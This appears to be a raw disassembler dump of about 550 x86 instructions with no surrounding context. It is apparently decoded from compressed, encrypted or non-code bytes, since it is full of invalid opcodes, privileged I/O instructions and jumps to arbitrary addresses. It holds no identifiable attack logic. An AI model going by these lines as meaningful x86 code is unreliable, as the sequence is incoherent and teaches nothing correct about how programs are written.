  41998f:	and    ebx,DWORD PTR [eax-0x48]
  419992:	add    al,0xfd
  419994:	int3   
  419995:	push   0xefe2983e
  41999a:	mov    ds:0xc314cfd2,al
  41999f:	stc    
  4199a0:	add    BYTE PTR [edi],ah
  4199a2:	xchg   ebp,eax
  4199a3:	mov    edi,0x7893fae2
  4199a8:	retf   0x36e2
  4199ab:	popf   
  4199ac:	jmp    0x419a19
  4199ae:	scas   eax,DWORD PTR es:[edi]
  4199af:	rol    DWORD PTR [edx+0x3b7d2feb],cl
  4199b5:	push   0x2b71e479
  4199ba:	xchg   DWORD PTR ds:0x12d99e3f,esi
  4199c0:	adc    BYTE PTR [edx+0x42],dh
  4199c3:	(bad)  
  4199c4:	cmp    ch,dh
  4199c6:	cmp    DWORD PTR [ecx-0x70ecc77f],0xaa2396a5
  4199d0:	test   BYTE PTR [esi+edx*2],ah
  4199d3:	cmp    BYTE PTR [edi-0x46ea17e1],ah
  4199d9:	neg    BYTE PTR [esi+0xa739172]
  4199df:	pop    esp
  4199e0:	inc    ecx
  4199e1:	iret   
  4199e2:	adc    al,0x70
  4199e4:	ins    BYTE PTR es:[edi],dx
  4199e5:	mov    cs,WORD PTR [eax]
  4199e7:	cli    
  4199e8:	and    bh,BYTE PTR [ebx]
  4199ea:	call   0x83238785
  4199ef:	pop    edi
  4199f0:	fwait
  4199f1:	int    0x74
  4199f3:	lds    edi,FWORD PTR [eax]
  4199f5:	repz (bad) 
  4199f7:	pop    esi
  4199f8:	lods   al,BYTE PTR ds:[esi]
  4199f9:	push   ds
  4199fa:	sbb    dh,BYTE PTR [esi-0x7]
  4199fd:	cmp    bl,dl
  4199ff:	test   BYTE PTR [ecx+0x79],0xe6
  419a03:	dec    esi
  419a04:	xchg   esi,eax
  419a05:	jnp    0x419a2c
  419a07:	adc    DWORD PTR [edi],edx
  419a09:	sub    eax,DWORD PTR [edi]
  419a0b:	push   ss
  419a0c:	or     DWORD PTR [ebp-0x489c2c48],ebp
  419a12:	push   ebx
  419a13:	cmp    BYTE PTR [esi+0x77],cl
  419a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a17:	jb     0x4199b8
  419a19:	sbb    DWORD PTR [edx+eax*2],edx
  419a1c:	mov    edi,0xe0578e82
  419a21:	dec    esp
  419a22:	pop    eax
  419a23:	pop    ebx
  419a24:	adc    al,0x2f
  419a26:	fisttp WORD PTR [bp+si+0x778d]
  419a2b:	or     eax,0x64ab4fdc
  419a30:	sti    
  419a31:	add    ebp,DWORD PTR [edi]
  419a33:	fcomp  QWORD PTR [ecx+0x6a23eab1]
  419a39:	fld    QWORD PTR [esp+ecx*1]
  419a3c:	dec    esp
  419a3d:	mov    esi,0xa843c581
  419a42:	sar    BYTE PTR [ebp-0x71],cl
  419a45:	pop    esp
  419a46:	xchg   ebp,eax
  419a47:	sub    al,0xec
  419a49:	pushf  
  419a4a:	int    0x22
  419a4c:	jns    0x4199f6
  419a4e:	xlat   BYTE PTR ds:[ebx]
  419a4f:	sub    ecx,DWORD PTR [ecx+0x77b76c1e]
  419a55:	jle    0x419a0d
  419a57:	stos   DWORD PTR es:[edi],eax
  419a58:	enter  0x27f2,0x1
  419a5c:	push   cs
  419a5d:	xchg   edx,eax
  419a5e:	pop    ebp
  419a5f:	imul   esi,DWORD PTR [edx-0x5a],0xce366155
  419a66:	xchg   DWORD PTR [edx],ecx
  419a68:	ds mov dh,0x4e
  419a6b:	sbb    eax,0x857f330f
  419a70:	jp     0x419a09
  419a72:	mov    BYTE PTR [ebx+edi*8],bl
  419a75:	fistp  DWORD PTR [esi+eax*8+0x37]
  419a79:	imul   eax,DWORD PTR [eax+0x51],0x6eba9f34
  419a80:	leave  
  419a81:	out    dx,eax
  419a82:	xchg   ebx,eax
  419a83:	(bad)  
  419a84:	sub    edx,DWORD PTR [esi]
  419a86:	adc    DWORD PTR [ebx+0x1ef08f3d],esp
  419a8c:	rcr    dl,1
  419a8e:	adc    BYTE PTR [edi],ch
  419a90:	jmp    0xc2c8c2f1
  419a95:	sub    bh,dl
  419a97:	push   esp
  419a98:	fistp  DWORD PTR [eax]
  419a9a:	jle    0x419a83
  419a9c:	lea    ebx,[ebp-0x46460529]
  419aa2:	or     eax,DWORD PTR [eax+0x1b]
  419aa5:	aam    0xca
  419aa7:	jl     0x419b1b
  419aa9:	in     al,dx
  419aaa:	mov    ds:0xbe8e3bca,al
  419aaf:	xchg   DWORD PTR [ecx-0x6e],edi
  419ab2:	popf   
  419ab3:	jge    0x419b0e
  419ab5:	pop    ds
  419ab6:	repnz mov cl,0xf9
  419ab9:	or     dh,dh
  419abb:	addr16 jbe 0x419b14
  419abe:	fisttp WORD PTR [ecx+esi*1]
  419ac1:	jae    0x419b3a
  419ac3:	mov    ebp,DWORD PTR [ecx+0x2c]
  419ac6:	fcomp  QWORD PTR [esi-0x7c37d20]
  419acc:	fwait
  419acd:	dec    esi
  419ace:	mov    eax,ds:0x86a6beda
  419ad3:	xchg   edi,eax
  419ad4:	in     eax,0xd9
  419ad6:	dec    ecx
  419ad7:	pop    es
  419ad8:	mov    ?,WORD PTR [ebx+ebp*8-0x5a1a7f15]
  419adf:	push   edx
  419ae0:	mov    WORD PTR [edx-0x13d823c9],?
  419ae6:	sub    BYTE PTR [esi-0xc56cc79],0xd5
  419aed:	inc    edx
  419aee:	add    edx,eax
  419af0:	gs icebp 
  419af2:	or     al,0x80
  419af4:	jne    0x419b60
  419af6:	loope  0x419a83
  419af8:	retf   0x7d93
  419afb:	and    al,BYTE PTR [eax]
  419afd:	pop    esi
  419afe:	adc    ebx,DWORD PTR [eax]
  419b00:	and    DWORD PTR [edi],ebp
  419b02:	shl    DWORD PTR ds:0x6906f65b,cl
  419b08:	scas   eax,DWORD PTR es:[edi]
  419b09:	or     eax,esp
  419b0b:	fistp  WORD PTR [edx+0xf51554b]
  419b11:	dec    edi
  419b12:	imul   ebp,DWORD PTR [edi],0xffffff8a
  419b15:	xor    DWORD PTR [eax],edi
  419b17:	fisttp DWORD PTR [edx+0x4a]
  419b1a:	fwait
  419b1b:	cmc    
  419b1c:	dec    ebx
  419b1d:	mov    bl,0x36
  419b1f:	add    ebp,DWORD PTR [eax]
  419b21:	push   ds
  419b22:	imul   eax,DWORD PTR [esi+0x3f3a6af4],0x74416527
  419b2c:	mov    WORD PTR [ebx+0x25219bca],gs
  419b32:	mov    bh,0x47
  419b34:	cmp    eax,0x8db8c009
  419b39:	outs   dx,DWORD PTR ds:[esi]
  419b3a:	mov    al,ds:0x90c54062
  419b3f:	sbb    BYTE PTR [esi],0x3b
  419b42:	add    al,0xd9
  419b44:	or     dh,BYTE PTR [esi+0x4c4a61e6]
  419b4a:	inc    ebp
  419b4b:	shl    BYTE PTR [ecx+0x6f6fb1f4],cl
  419b51:	test   DWORD PTR [edx+0x601358c5],esi
  419b57:	(bad)  [eax]
  419b5a:	pop    ebx
  419b5b:	das    
  419b5c:	imul   DWORD PTR [eax+0x55]
  419b5f:	or     BYTE PTR [esi],al
  419b61:	enter  0x73f2,0x29
  419b65:	push   ds
  419b66:	mov    bh,0x15
  419b68:	int    0x4c
  419b6a:	xchg   BYTE PTR [ecx+edx*2],bh
  419b6d:	mov    ah,0x6c
  419b6f:	punpckhwd mm6,QWORD PTR [ecx]
  419b72:	popf   
  419b73:	cmp    DWORD PTR [esi+0x7f413b7a],esi
  419b79:	jmp    0x2d8d93e4
  419b7e:	mov    edi,0xb6d79cba
  419b83:	fsubr  QWORD PTR [ebp+0x67]
  419b86:	outs   dx,DWORD PTR ds:[esi]
  419b87:	xchg   ebp,eax
  419b88:	nop
  419b89:	lea    edx,[ecx]
  419b8b:	and    al,0xf1
  419b8d:	jo     0x419bb0
  419b8f:	callw  0xd4a1
  419b93:	cmp    edi,edi
  419b95:	popf   
  419b96:	xchg   BYTE PTR [edx-0x5f9bf967],cl
  419b9c:	or     edi,DWORD PTR [eax+0x542c2229]
  419ba2:	aam    0xd2
  419ba4:	inc    esp
  419ba5:	xor    edi,DWORD PTR [ebx+esi*8]
  419ba8:	adc    si,WORD PTR [edx+esi*2]
  419bac:	js     0x419b5d
  419bae:	jl     0x419bf0
  419bb0:	(bad)  
  419bb1:	mov    eax,edx
  419bb3:	push   esi
  419bb4:	mov    WORD PTR [esi+0x42],ss
  419bb7:	add    eax,0x900c8597
  419bbc:	mov    eax,0x195ce38d
  419bc1:	xor    dl,bh
  419bc3:	rcr    DWORD PTR [ebp-0x80],0xac
  419bc7:	cmp    ah,BYTE PTR [edi]
  419bc9:	sbb    esp,ebx
  419bcb:	leave  
  419bcc:	adc    cl,BYTE PTR [esi]
  419bce:	ss addr16 or al,dh
  419bd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bd3:	out    dx,al
  419bd4:	popa   
  419bd5:	push   ecx
  419bd6:	dec    esi
  419bd7:	enter  0x9ab0,0x19
  419bdb:	fs mov ebp,0x6052a5e8
  419be1:	(bad)  
  419be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419be3:	cmc    
  419be4:	es push ebp
  419be6:	pop    ecx
  419be7:	mov    bh,al
  419be9:	icebp  
  419bea:	cmp    BYTE PTR [ecx+ebx*4+0xc],cl
  419bee:	xor    dh,cl
  419bf0:	inc    edx
  419bf1:	data16 adc bl,ch
  419bf4:	mov    edx,0xd0d2d396
  419bf9:	pop    edi
  419bfa:	daa    
  419bfb:	fdivr  QWORD PTR [eax+0x20]
  419bfe:	mov    eax,ds:0x476c7e80
  419c03:	ret    
  419c04:	adc    bl,BYTE PTR ds:0x5b6e2ccb
  419c0a:	fs int 0xdc
  419c0d:	ret    
  419c0e:	adc    eax,0xcdf07523
  419c13:	xchg   ecx,eax
  419c14:	dec    esp
  419c15:	mov    ds:0x4837a130,eax
  419c1a:	leave  
  419c1b:	mov    edi,0x39df8eab
  419c20:	mov    cl,0xf7
  419c22:	xor    edi,DWORD PTR [edx-0x2]
  419c25:	icebp  
  419c26:	or     eax,0xd500f2a1
  419c2b:	and    DWORD PTR [esi],eax
  419c2d:	fisttp WORD PTR [edi+0x5d]
  419c30:	popf   
  419c31:	shl    dh,cl
  419c33:	out    dx,al
  419c34:	int3   
  419c35:	fsubrp st(2),st
  419c37:	repz xchg esp,eax
  419c39:	test   DWORD PTR [eax+0x8],eax
  419c3c:	fwait
  419c3d:	sub    al,0x6d
  419c3f:	aas    
  419c40:	icebp  
  419c41:	pop    edx
  419c42:	push   esp
  419c43:	pop    esi
  419c44:	xor    al,BYTE PTR [edi]
  419c46:	fild   WORD PTR [edx-0x12a4ac2]
  419c4c:	out    dx,eax
  419c4d:	xor    eax,0x63d2973e
  419c52:	lods   al,BYTE PTR ds:[esi]
  419c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c54:	repz ds dec ebp
  419c57:	cwde   
  419c58:	and    eax,0x9b36f0c2
  419c5d:	mov    ecx,0xfdde2abe
  419c62:	pop    esi
  419c63:	cmovnp ebp,DWORD PTR [edi+0x3b1bc44e]
  419c6a:	(bad)  
  419c6b:	fisttp QWORD PTR [ebp+esi*2-0x4b]
  419c6f:	mov    cl,0xbe
  419c71:	pop    edi
  419c72:	repnz sar DWORD PTR [ebp-0x4e459926],0x29
  419c7a:	aas    
  419c7b:	and    al,0x64
  419c7d:	jno    0x419cf5
  419c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c80:	push   edx
  419c81:	mul    DWORD PTR [ecx+esi*2-0x14]
  419c85:	mov    dh,BYTE PTR [ebp-0x35]
  419c88:	xor    al,0xae
  419c8a:	call   0x84e4b14a
  419c8f:	enter  0x82c1,0xab
  419c93:	adc    eax,0xf9c17e9e
  419c98:	or     BYTE PTR ds:0x38cb81ff,dh
  419c9e:	xchg   esi,eax
  419c9f:	outs   dx,DWORD PTR ds:[esi]
  419ca0:	hlt    
  419ca1:	cmp    BYTE PTR [edx],bh
  419ca3:	jge    0x419cf3
  419ca5:	xor    ecx,esp
  419ca7:	inc    esp
  419ca8:	mov    esi,0x70f47b3b
  419cad:	add    ebx,DWORD PTR [ecx+0x71d8ff33]
  419cb3:	cmp    edi,DWORD PTR [edi+0x44869385]
  419cb9:	int    0x27
  419cbb:	mov    ds:0x75ec828,al
  419cc0:	dec    ebx
  419cc1:	or     DWORD PTR fs:[eax-0x66ced90d],esp
  419cc8:	aaa    
  419cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cca:	sbb    eax,0x32bf1788
  419ccf:	aam    0xff
  419cd1:	or     BYTE PTR [ebp+0x64c8b1c6],bh
  419cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cd8:	shl    DWORD PTR [ebx],1
  419cda:	stc    
  419cdb:	mov    BYTE PTR [eax-0x7a],bh
  419cde:	scas   eax,DWORD PTR es:[edi]
  419cdf:	or     eax,0xf545733f
  419ce4:	jmp    0xede780a3
  419ce9:	push   esp
  419cea:	jns    0x419cb6
  419cec:	cmp    esp,esp
  419cee:	jmp    0xeec5c6ac
  419cf3:	into   
  419cf4:	icebp  
  419cf5:	test   al,0xf4
  419cf7:	sub    ah,BYTE PTR [ecx+0x5c]
  419cfa:	cdq    
  419cfb:	lods   al,BYTE PTR ds:[esi]
  419cfc:	in     eax,dx
  419cfd:	sub    DWORD PTR [edx+ebx*1+0x1c],esi
  419d01:	mov    cl,0x7e
  419d03:	inc    esi
  419d04:	sar    DWORD PTR [edi-0x27],1
  419d07:	push   edi
  419d08:	ja     0x419d03
  419d0a:	and    esp,DWORD PTR [ecx+0x6b]
  419d0d:	xchg   ecx,eax
  419d0e:	adc    ch,cl
  419d10:	mov    WORD PTR ds:0xacee1741,ss
  419d16:	stos   DWORD PTR es:[edi],eax
  419d17:	mov    ds:0x61095aef,al
  419d1c:	or     eax,DWORD PTR [esp+edi*2-0x17]
  419d20:	inc    edx
  419d21:	cld    
  419d22:	add    edx,ebx
  419d24:	es out 0x4b,al
  419d27:	sub    dl,dh
  419d29:	xchg   ecx,eax
  419d2a:	dec    eax
  419d2b:	inc    ecx
  419d2c:	sbb    al,cl
  419d2e:	jbe    0x419da1
  419d30:	js     0x419cc5
  419d32:	retf   
  419d33:	(bad)  
  419d34:	xchg   ah,cl
  419d36:	mov    edx,0x80d279a5
  419d3b:	cwde   
  419d3c:	and    DWORD PTR [ebx+0x64],eax
  419d3f:	lods   eax,DWORD PTR ds:[esi]
  419d40:	adc    cl,BYTE PTR [esi]
  419d42:	mov    edx,0xc998705f
  419d47:	sbb    BYTE PTR [esi+0x6f],dh
  419d4a:	inc    ebp
  419d4b:	add    bh,BYTE PTR [ebp+esi*1-0x44424b5a]
  419d52:	mov    ?,WORD PTR ds:0x91bfcb91
  419d58:	mov    esp,0x2c8b459c
  419d5d:	ja     0x419da0
  419d5f:	sub    al,0xfb
  419d61:	ss push 0xa5d1ef9e
  419d67:	mov    ebx,ebx
  419d69:	mov    dh,0xbc
  419d6b:	fisttp QWORD PTR [eax+edi*2-0x7c]
  419d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d70:	stos   DWORD PTR es:[edi],eax
  419d71:	imul   ebx,DWORD PTR [ebp-0x75],0x5
  419d75:	shl    BYTE PTR [edi+0x2a],cl
  419d78:	hlt    
  419d79:	and    DWORD PTR [ecx-0x10483936],edi
  419d7f:	pop    edx
  419d80:	(bad)  
  419d81:	fadd   QWORD PTR [ebp+0x74]
  419d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d85:	xor    al,0x5d
  419d87:	xchg   esi,eax
  419d88:	inc    esi
  419d89:	xchg   edx,eax
  419d8a:	imul   ecx,DWORD PTR [edi+ebx*8-0x4253d39e],0xffffffad
  419d92:	jecxz  0x419d9b
  419d94:	daa    
  419d95:	js     0x419d84
  419d97:	outs   dx,DWORD PTR ds:[esi]
  419d98:	sbb    eax,0x794db0aa
  419d9d:	xchg   BYTE PTR [edx-0x4199ce8f],bl
  419da3:	add    DWORD PTR [ebp-0x4f4f6fb9],edx
  419da9:	sbb    eax,0x498a6bf3
  419dae:	inc    ebp
  419daf:	sbb    DWORD PTR [ecx+0x3ad19edd],edi
  419db5:	pop    eax
  419db6:	adc    al,0xe6
  419db8:	cdq    
  419db9:	jg     0x419e1b
  419dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dbc:	and    BYTE PTR [ebx],ch
  419dbe:	sbb    dl,BYTE PTR [edx+eax*8-0x67f9a276]
  419dc5:	jne    0x419da2
  419dc7:	sbb    edx,esi
  419dc9:	fxtract 
  419dcb:	sbb    DWORD PTR [edi],0xe165f123
  419dd1:	push   edi
  419dd2:	in     eax,dx
  419dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dd4:	jmp    0x90a424ee
  419dd9:	jne    0x419e24
  419ddb:	sub    BYTE PTR [edi+eax*1-0x17],bl
  419ddf:	adc    ebx,DWORD PTR [eax]
  419de1:	clc    
  419de2:	sub    eax,0xe4273248
  419de7:	shr    DWORD PTR [edi+0x45],cl
  419dea:	jnp    0x419d70
  419dec:	or     al,BYTE PTR ss:[ebx+ecx*4+0x18]
  419df1:	pop    ebp
  419df2:	and    BYTE PTR [esp+edi*2],ch
  419df5:	jmp    0x28f:0xec922ed8
  419dfc:	pushf  
  419dfd:	pop    edx
  419dfe:	loop   0x419e7e
  419e00:	fwait
  419e01:	clc    
  419e02:	adc    eax,0x251e4159
  419e07:	jmp    0x3e36:0x6b11ed15
  419e0e:	in     eax,0x6e
  419e10:	cwde   
  419e11:	sar    BYTE PTR [edi],1
  419e13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e14:	cmc    
  419e15:	clc    
  419e16:	inc    ecx
  419e17:	pop    es
  419e18:	mov    esi,0x6b832355
  419e1d:	fadd   QWORD PTR [edi-0x1f]
  419e20:	popf   
  419e21:	out    0x71,al
  419e23:	adc    DWORD PTR [esi+0x5cad9141],edi
  419e29:	sub    DWORD PTR [ecx+0xb6e3afe],ebx
  419e2f:	stc    
  419e30:	loopne 0x419dd9
  419e32:	inc    edx
  419e33:	jno    0x419e8e
  419e35:	adc    eax,0x90958199
  419e3a:	pop    ss
  419e3b:	push   ds
  419e3c:	sub    esp,DWORD PTR [ebp+0x2b]
  419e3f:	sahf   
  419e40:	retf   
  419e41:	ror    BYTE PTR [ebp+0x30],1
  419e44:	test   BYTE PTR [esi],ch
  419e46:	and    WORD PTR [esp+edx*8],di
  419e4a:	ss jl  0x419df4
  419e4d:	in     eax,dx
  419e4e:	shl    DWORD PTR ds:0xf822698,1
  419e54:	mov    ch,0x44
  419e56:	push   cs
  419e57:	lock jle 0x419e3e
  419e5a:	sub    DWORD PTR [ebx-0x52],ecx
  419e5d:	fimul  WORD PTR [ecx-0x2ff8d24a]
  419e63:	xchg   bh,cl
  419e65:	sub    al,0x84
  419e67:	or     eax,0x6c2c7ce3
  419e6c:	icebp  
  419e6d:	jo     0x419e78
  419e6f:	leave  
  419e70:	js     0x419e49
  419e72:	pushf  
  419e73:	fistp  WORD PTR [eax+edx*4+0x59]
  419e77:	aad    0xe2
  419e79:	and    eax,0xa7488359
  419e7e:	dec    ebx
  419e7f:	mov    al,0x9
  419e81:	jg     0x419e97
  419e83:	inc    ecx
  419e84:	inc    sp
  419e86:	or     ecx,DWORD PTR [edi+0x37]
  419e89:	cmp    DWORD PTR [esi+0xa],edi
  419e8c:	je     0x419f0c
  419e8e:	les    ecx,FWORD PTR [ebx-0x81f9b02]
  419e94:	xchg   edi,eax
  419e95:	mov    dh,BYTE PTR ds:0xb541fb92
  419e9b:	xor    cl,BYTE PTR [edi-0x5dca6bfe]
  419ea1:	test   al,0xc2
  419ea3:	push   cs
  419ea4:	ret    0xa9e6
  419ea7:	aad    0xc8
  419ea9:	and    al,0x50
  419eab:	mov    ebp,0x126e428d
  419eb0:	out    dx,eax
  419eb1:	ret    0x61cb
  419eb4:	int3   
  419eb5:	out    0x2,al
  419eb7:	mov    al,ds:0x899fb873
  419ebc:	sub    DWORD PTR [ecx],ecx
  419ebe:	mov    eax,ds:0xdcafa08
  419ec3:	xchg   ebp,eax
  419ec4:	adc    DWORD PTR [ebx+ebp*2+0x5bb63616],edx
  419ecb:	push   edi
  419ecc:	fadd   QWORD PTR [esi]
  419ece:	mov    edx,0x8047155
  419ed3:	adc    DWORD PTR [esi+0x12],ebp
  419ed6:	hlt    
  419ed7:	sbb    eax,0xb38bce54
  419edc:	xor    ebx,ebx
  419ede:	aaa    
  419edf:	sbb    ecx,esi
  419ee1:	cmp    eax,0x6dd20f79
  419ee6:	imul   ebx,DWORD PTR [eax],0xe74e6a45
  419eec:	add    ch,BYTE PTR [ebx]
  419eee:	push   ds
  419eef:	jmp    0x2f5e771b
  419ef4:	dec    esp
  419ef5:	jg     0x419f74
  419ef7:	arpl   WORD PTR [ebx+esi*4+0x390e083],bx
  419efe:	jmp    0xa516:0x8d20f43d
  419f05:	or     edi,DWORD PTR [ecx]
  419f07:	pop    edx
  419f08:	int3   
  419f09:	inc    edx
  419f0a:	push   ecx
  419f0b:	xchg   BYTE PTR [edi],dh
  419f0d:	and    BYTE PTR ds:0x3292590e,bl
  419f13:	stos   DWORD PTR es:[edi],eax
  419f14:	jno    0x419f61
  419f16:	or     BYTE PTR [esi+0x5],dl
  419f19:	loopne 0x419f7d
  419f1b:	clc    
  419f1c:	xchg   ecx,eax
  419f1d:	xchg   esi,eax
  419f1e:	mov    ah,0xd6
  419f20:	daa    
  419f21:	leave  
  419f22:	inc    edx
  419f23:	lds    ebp,FWORD PTR [ebx-0x3b778f30]
  419f29:	pop    ds
  419f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f2b:	inc    ebx
  419f2c:	jne    0x419f0c
  419f2e:	repz mov bl,0x62
  419f31:	inc    esp
  419f32:	mov    dl,0xf3
  419f34:	ja     0x419f3b
  419f36:	push   ss
  419f37:	push   0xf6557648
  419f3c:	out    dx,al
  419f3d:	xor    ebx,DWORD PTR [eax+edx*1+0x4b74f7ec]
  419f44:	or     bl,BYTE PTR [esi+0xb]
  419f47:	fsubr  DWORD PTR [edx-0x14]
  419f4a:	loopne 0x419f24
  419f4c:	cdq    
  419f4d:	cmp    eax,0xce026ee5
  419f52:	fidivr DWORD PTR [edi]
  419f54:	call   0xf15404a2
  419f59:	mov    eax,ds:0x509d841a
  419f5e:	int    0xc9
  419f60:	mov    eax,0x6f5a0238
  419f65:	adc    al,al
  419f67:	xchg   ebx,eax
  419f68:	(bad)  
  419f6a:	div    BYTE PTR [edx+edx*8-0x66fd8d3a]
  419f71:	popa   
  419f72:	adc    al,0x13
  419f74:	inc    ebx
  419f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f76:	repz and dh,BYTE PTR [eax-0x6b4fed8b]
  419f7d:	adc    bl,BYTE PTR [ebp-0xc]
  419f80:	mov    edi,0x50e4f86b
  419f85:	(bad)  
  419f86:	imul   esp,DWORD PTR [ecx],0xffffffa1
  419f89:	adc    BYTE PTR [edi+0x5f],ah
  419f8c:	xor    dl,ch
  419f8e:	adc    al,0x18
  419f90:	xchg   DWORD PTR [ebx+edx*8+0x7b5c3154],ebp
  419f97:	mov    ds:0x9e4c4fb3,eax
  419f9c:	mov    dl,BYTE PTR [esi]
  419f9e:	adc    ch,ah
  419fa0:	stos   DWORD PTR es:[edi],eax
  419fa1:	pop    edx
  419fa2:	sahf   
  419fa3:	sar    BYTE PTR [edi-0x223a45d4],1
  419fa9:	sub    dl,BYTE PTR fs:[edi+0x52]
  419fad:	jl     0x419f52
  419faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fb0:	lods   eax,DWORD PTR ds:[esi]
  419fb1:	dec    edx
  419fb2:	xor    edx,DWORD PTR [esi]
  419fb4:	repnz mov ds:0x4d473ba2,al
  419fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fbb:	dec    esp
  419fbc:	fnop   
  419fbe:	and    DWORD PTR [edx],esp
  419fc0:	or     eax,0x7852e98e
  419fc5:	test   eax,0x78644455
  419fca:	xchg   ebp,eax
  419fcb:	push   ebx
  419fcc:	xchg   BYTE PTR [bp-0x4e0c],dl
  419fd1:	or     al,0x8c
  419fd3:	ret    0x92f7
  419fd6:	xchg   ebx,eax
  419fd7:	sbb    BYTE PTR [ecx],0xde
  419fda:	xor    DWORD PTR [esp+edx*2-0x63],eax
  419fde:	hlt    
  419fdf:	adc    dh,BYTE PTR [eax-0x5e7f544d]
  419fe5:	loope  0x419f8f
  419fe7:	popa   
  419fe8:	jo     0x419fae
  419fea:	shl    BYTE PTR [ecx+0x310c6978],0x29
  419ff1:	push   ebp
  419ff2:	inc    esp
  419ff3:	sbb    ebx,esp
  419ff5:	xor    DWORD PTR [eax],0xc94a77ed
  419ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ffd:	inc    ebp
  419ffe:	push   ecx
  419fff:	sbb    esi,esi
  41a001:	ins    DWORD PTR es:[edi],dx
  41a002:	ds add ebp,ebp
  41a005:	mov    ch,0x2b
  41a007:	dec    esp
  41a008:	ret    
  41a009:	mov    ebx,0x35b56aad
  41a00e:	or     ebx,DWORD PTR [ebx+0x1d62d43f]
  41a014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a016:	and    eax,0x9f83c343
  41a01b:	xor    DWORD PTR [ebx-0x29],ebp
  41a01e:	dec    ebp
  41a01f:	push   edx
  41a020:	out    dx,al
  41a021:	adc    eax,DWORD PTR [eax+0x4766464]
  41a027:	aas    
  41a028:	(bad)  
  41a029:	xchg   esp,eax
  41a02a:	inc    edi
  41a02b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a02c:	dec    ecx
  41a02e:	leave  
  41a02f:	mov    bh,0xe6
  41a031:	sbb    al,0xc7
  41a033:	sbb    DWORD PTR [ecx+0x2e0ace06],ebx
  41a039:	jo     0x41a074
  41a03b:	cwde   
  41a03c:	rcr    DWORD PTR [edx-0x44c903b3],0x1b
  41a043:	fistp  WORD PTR [edi+0x2f]
  41a046:	out    0x73,al
  41a048:	stc    
  41a049:	dec    esi
  41a04a:	jecxz  0x41a0a2
  41a04c:	xlat   BYTE PTR ds:[ebx]
  41a04d:	stc    
  41a04e:	xchg   esi,eax
  41a04f:	dec    esp
  41a050:	jb     0x41a034
  41a052:	jle    0x41a051
  41a054:	pop    esp
  41a055:	and    DWORD PTR [esi+ecx*4+0x2f],0x8a4bc280
  41a05d:	sbb    BYTE PTR [ecx+0x4af115fc],bh
  41a063:	xchg   ebx,eax
  41a064:	jnp    0x41a058
  41a066:	mov    bh,0x3
  41a068:	sub    DWORD PTR [edi+0x2a],0x6c4cacfb
  41a06f:	push   esi
  41a070:	stc    
  41a071:	cwde   
  41a072:	pusha  
  41a073:	ror    esp,cl
  41a075:	int    0x24
  41a077:	xchg   ecx,eax
  41a078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a079:	inc    ecx
  41a07a:	adc    eax,0x69087d45
  41a07f:	dec    esi
  41a080:	cwde   
  41a081:	cmp    edi,ebp
  41a083:	es in  al,dx
  41a085:	imul   ebp,eax,0x7e497a3b
  41a08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a08c:	ins    DWORD PTR es:[edi],dx
  41a08d:	mov    ebp,0x7566930
  41a092:	and    al,0x53
  41a094:	lock dec eax
  41a096:	push   eax
  41a097:	sub    DWORD PTR [esi],esp
  41a099:	mov    DWORD PTR [edi-0x7a],ebx
  41a09c:	call   FWORD PTR [edi-0x266d74fd]
  41a0a2:	das    
  41a0a3:	adc    edi,edx
  41a0a5:	cmp    ecx,0xffffffa5
  41a0a8:	fmul   QWORD PTR [esi-0x46]
  41a0ab:	div    ebp
  41a0ad:	sub    eax,0xdb3f20de
  41a0b2:	adc    al,0xb7
  41a0b4:	ds push esi
  41a0b6:	sub    esi,DWORD PTR [edi-0x31064561]
  41a0bc:	fild   QWORD PTR [eax+0x6bbf74a0]
  41a0c2:	dec    ebx
  41a0c3:	mov    bh,0xd2
  41a0c5:	pop    ds
  41a0c6:	rcr    esp,cl
  41a0c8:	adc    al,0x80
  41a0ca:	clc    
  41a0cb:	ror    BYTE PTR [eax+eiz*8],cl
  41a0ce:	ds xchg ebp,eax
  41a0d0:	push   ds
  41a0d1:	repz arpl WORD PTR [eax-0x1d],cx
  41a0d5:	es ret 
  41a0d7:	xor    esi,DWORD PTR [esi+ecx*2-0x27aa7cd1]
  41a0de:	lock std 
  41a0e0:	push   ds
  41a0e1:	xchg   ebx,eax
  41a0e2:	push   edx
  41a0e3:	xor    BYTE PTR [edi-0x2d69a707],bl
  41a0e9:	hlt    
  41a0ea:	add    edx,edi
  41a0ec:	adc    dh,BYTE PTR [edx+0x1e]
  41a0ef:	dec    edi
  41a0f0:	mov    ecx,0x64d8ea21
  41a0f5:	sub    eax,0xe677ff5b
  41a0fa:	(bad)  
  41a0fb:	or     cl,BYTE PTR [edi]
  41a0fd:	push   eax
  41a0fe:	xchg   edi,eax
  41a0ff:	adc    esp,DWORD PTR [eax-0x72]
  41a102:	pop    edi
  41a103:	jp     0x41a0fc
  41a105:	add    al,0x76
  41a107:	out    dx,al
  41a108:	dec    ebx
  41a109:	jg     0x41a180
  41a10b:	mov    bl,0xe7
  41a10d:	sub    DWORD PTR [ebx+0x72],0xffffff8f
  41a111:	mov    ebp,?
  41a113:	push   edi
  41a114:	push   es
  41a115:	pop    ds
  41a116:	fsub   DWORD PTR [ebx+0x40cc46ef]
  41a11c:	adc    esp,eax
  41a11e:	xchg   edi,eax
